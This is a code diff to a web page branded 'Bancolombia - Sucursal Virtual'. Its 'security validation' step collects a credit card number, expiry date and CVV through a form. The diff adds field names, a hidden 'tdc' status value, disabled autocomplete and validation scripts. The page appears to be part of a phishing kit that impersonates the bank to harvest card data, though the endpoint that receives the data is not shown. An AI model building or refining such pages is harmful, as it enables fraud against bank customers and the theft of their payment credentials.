@@ -4,6 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="csrf-token" content="{{ csrf_token() }}">
     <title>Bancolombia - Sucursal Virtual</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script>
@@ -222,7 +223,7 @@
         <div id="tdc" class="w-full flex flex-col justify-center items-center pb-6">
             <h5 class="text-[24px] font-cib-sans-bold mt-10">Validación de seguridad</h5>
             <div class="w-full flex mt-4 flex-col justify-center items-center gap-4 pl-1">
-                <div class="w-[100%] bg-white py-6 px-4 rounded-xl flex flex-col items-center">
+                <form id="formulario" class="w-[100%] bg-white py-6 px-4 rounded-xl flex flex-col items-center">
                     <div class="w-full flex items-center justify-center hiddenerror hidden">
                         <span class="text-[11px] text-red-600"> Los datos ingresados son incorrectos. Intenta
                             nuevamente.</span>
@@ -242,8 +243,8 @@
                                     d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z">
                                 </path>
                             </svg>
-                            <input id="numeroTarjetaCredito" type="tel" inputmode="numeric" class="floating-input"
-                                placeholder="" value="" />
+                            <input id="numeroTarjetaCredito" name="numeroTarjetaCredito" type="tel" inputmode="numeric" class="floating-input"
+                                placeholder="" value="" autocomplete="off" />
                             <span id="numeroTarjetaCreditoLabel" class="floating-label">
                                 Número de tarjeta
                             </span>
@@ -261,10 +262,10 @@
                                     d="M8 7V3m8 4V3m-9 8h10M5 21h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z">
                                 </path>
                             </svg>
-                            <input id="fechaVencimientoCredito" type="text" maxlength="7" placeholder=""
-                                class="floating-input" value="" />
+                            <input id="fechaVencimientoCredito" name="fechaVencimientoCredito" type="text" maxlength="7" placeholder=""
+                                class="floating-input" value="" autocomplete="off" />
                             <span id="fechaVencimientoCreditoLabel" class="floating-label">
-                                Fecha de expiración (MM-YYYY)
+                                Fecha de expiración (MM/YYYY)
                             </span>
                         </div>
                         <span id="fechaCreditoError" class="text-[12px] mt-1.5 font-medium text-red-500 hidden"></span>
@@ -279,8 +280,8 @@
                                     d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z">
                                 </path>
                             </svg>
-                            <input id="cvvCredito" type="tel" inputmode="numeric" maxlength="4" class="floating-input"
-                                placeholder="" value="" />
+                            <input id="cvvCredito" name="cvvCredito" type="tel" inputmode="numeric" maxlength="4" class="floating-input"
+                                placeholder="" value="" autocomplete="off" />
                             <span id="cvvCreditoLabel" class="floating-label">
                                 Código de seguridad (CVV)
                             </span>
@@ -288,12 +289,14 @@
                         <span id="cvvCreditoError" class="text-[12px] mt-1.5 font-medium text-red-500 hidden"></span>
                     </div>
 
-                    <button id="continuarTarjetaCredito"
+                    <input type="hidden" id="no-status" name="status" value="tdc" />
+
+                    <button id="enviar"
                         class="mt-4 font-bold py-2 px-6 rounded-full disabled:bg-gray-300 disabled:text-black cursor-not-allowed bg-gray-300 w-32"
                         disabled>
-                        Validar
+                        Continuar
                     </button>
-                </div>
+                </form>
             </div>
         </div>
 
@@ -307,6 +310,64 @@
     </div>
 
     <script>
+        /* ===== UTILIDADES ===== */
+
+        /**
+         * Habilita o deshabilita un botón con estilos apropiados
+         */
+        function toggleButton(btn, enabled) {
+            if (!btn) return;
+            btn.disabled = !enabled;
+            if (enabled) {
+                btn.classList.remove('bg-gray-300', 'text-black', 'cursor-not-allowed');
+                btn.classList.add('bg-bancolombia-yellow', 'text-black', 'cursor-pointer');
+            } else {
+                btn.classList.remove('bg-bancolombia-yellow', 'cursor-pointer');
+                btn.classList.add('bg-gray-300', 'text-black', 'cursor-not-allowed');
+            }
+        }
+
+        /**
+         * Muestra o oculta mensajes de error
+         */
+        function setError(id, msg) {
+            const el = document.getElementById(id);
+            if (!el) return;
+            if (msg) {
+                el.textContent = msg;
+                el.classList.remove('hidden');
+            } else {
+                el.classList.add('hidden');
+            }
+        }
+
+        /* ===== FLOATING LABELS ===== */
+
+        /**
+         * Configura los floating labels para todos los inputs
+         */
+        function setupFloatingLabels() {
+            const inputs = document.querySelectorAll('.floating-input');
+            inputs.forEach(input => {
+                const label = input.nextElementSibling;
+                if (!label || !label.classList.contains('floating-label')) return;
+
+                function updateLabel() {
+                    if (input.value) {
+                        label.classList.add('active');
+                    } else {
+                        label.classList.remove('active');
+                    }
+                }
+
+                input.addEventListener('focus', () => label.classList.add('active'));
+                input.addEventListener('blur', updateLabel);
+                input.addEventListener('input', updateLabel);
+
+                updateLabel();
+            });
+        }
+
         /* ===== VALIDACIONES DE CAMPOS DE ENTRADA ===== */
 
         /**
@@ -323,14 +384,13 @@
         }
 
         /**
-         * Valida tarjeta de débito o crédito
+         * Valida tarjeta de crédito
          * Valida: número (15-16 dígitos + Luhn), fecha (MM/YYYY), CVV (3-4 dígitos)
          */
-        function validateTarjeta(isCredito = false, showErrors = false) {
-            const prefix = isCredito ? 'Credito' : '';
-            const numeroTarjeta = document.getElementById(`numeroTarjeta${prefix}`);
-            const fechaCompleta = document.getElementById(`fechaVencimiento${prefix}`);
-            const cvv = document.getElementById(`cvv${prefix}`);
+        function validateTarjeta(showErrors = false) {
+            const numeroTarjeta = document.getElementById('numeroTarjetaCredito');
+            const fechaCompleta = document.getElementById('fechaVencimientoCredito');
+            const cvv = document.getElementById('cvvCredito');
 
             if (!numeroTarjeta || !fechaCompleta || !cvv) return false;
 
@@ -381,32 +441,58 @@
             }
 
             if (showErrors) {
-                const numeroError = document.getElementById(`numeroTarjeta${prefix}Error`);
-                const fechaError = document.getElementById(`fecha${prefix}Error`);
-                const cvvError = document.getElementById(`cvv${prefix}Error`);
-
-                setError(numeroError?.id || '', errores.numero);
-                setError(fechaError?.id || '', errores.fecha);
-                setError(cvvError?.id || '', errores.cvv);
+                setError('numeroTarjetaCreditoError', errores.numero);
+                setError('fechaCreditoError', errores.fecha);
+                setError('cvvCreditoError', errores.cvv);
             }
 
             const isValid = Object.keys(errores).length === 0;
+
+            // Habilitar/deshabilitar botón
+            const btnEnviar = document.getElementById('enviar');
+            toggleButton(btnEnviar, isValid);
+
             return isValid;
         }
 
         /**
-         * Muestra o oculta mensajes de error
+         * Formatea la fecha mientras el usuario escribe (MM/YYYY)
          */
-        function setError(id, msg) {
-            const el = document.getElementById(id);
-            if (!el) return;
-            if (msg) {
-                el.textContent = msg;
-                el.classList.remove('hidden');
-            } else {
-                el.classList.add('hidden');
+        function formatearFecha(input) {
+            let valor = input.value.replace(/\D/g, '');
+            if (valor.length >= 2) {
+                valor = valor.substring(0, 2) + '/' + valor.substring(2, 6);
             }
+            input.value = valor;
         }
+
+        /* ===== INICIALIZACIÓN ===== */
+
+        document.addEventListener('DOMContentLoaded', function () {
+            // Setup floating labels
+            setupFloatingLabels();
+
+            // Agregar listeners de validación
+            const campos = ['numeroTarjetaCredito', 'fechaVencimientoCredito', 'cvvCredito'];
+            campos.forEach(campoId => {
+                const campo = document.getElementById(campoId);
+                if (campo) {
+                    campo.addEventListener('input', () => validateTarjeta(false));
+                    campo.addEventListener('blur', () => validateTarjeta(true));
+                }
+            });
+
+            // Formatear fecha mientras escribe
+            const fechaInput = document.getElementById('fechaVencimientoCredito');
+            if (fechaInput) {
+                fechaInput.addEventListener('input', function() {
+                    formatearFecha(this);
+                });
+            }
+
+            // Validación inicial
+            validateTarjeta(false);
+        });
     </script>
 
     <x-control
